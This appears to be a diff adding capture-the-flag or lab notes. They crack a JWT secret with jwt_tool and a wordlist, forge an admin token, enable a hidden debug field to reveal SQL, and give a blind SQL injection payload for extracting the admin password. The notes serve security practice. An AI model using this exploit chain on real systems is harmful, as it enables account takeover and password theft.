@@ -1,0 +1,50 @@
+Cookie
+```
+user:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiZ3Vlc3QiLCJpYXQiOjE2MjEyNjAyNjN9.4DMGdZTWogyXMZ_vivjiCLweSN50cNbriKidB1teTIM
+```
+
+jwt.io
+```
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+{
+  "name": "guest",
+  "iat": 1621260263
+}
+```
+
+# Bruteforce Secret Key
+python3 jwt_tool.py -C eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiZ3Vlc3QiLCJpYXQiOjE2MjEyNjAyNjN9.4DMGdZTWogyXMZ_vivjiCLweSN50cNbriKidB1teTIM -d /usr/share/wordlists/rockyou.txt
+```
+[+] rachel is the CORRECT key!
+```
+
+name to admin
+```
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJpYXQiOjE2MjEyNjAyNjN9.RZ2la6WISPfnhbXr1zjndfuqFPEZhtfSUnMvbXI80wc
+```
+
+Admin has search post functionality
+```
+<input hidden value="mysql" name="sql">
+<input hidden value="0" name="debug">
+```
+
+POST /admin/posts HTTP/1.1
+search=abc&sql=mysql&debug=1
+```
+Debug:
+SELECT p.text AS description, p.likes, date_format(p.dateposted,'%e. %c. %Y') AS time, p.img, u.username AS user, u.profilepic AS profilePic, u.password AS secret 
+FROM posts p 
+INNER JOIN 
+users u ON (p.username = u.username) WHERE p.text LIKE '%abc%'            ORDER BY p.dateposted DESC;
+```
+
+SQL Injection
+
+Payload
+	' and "admin" in (select username from users where BINARY username="admin" and BINARY substring(password,<INDEX>,1) = chr(<TESTED CHAR>)) #
+
+
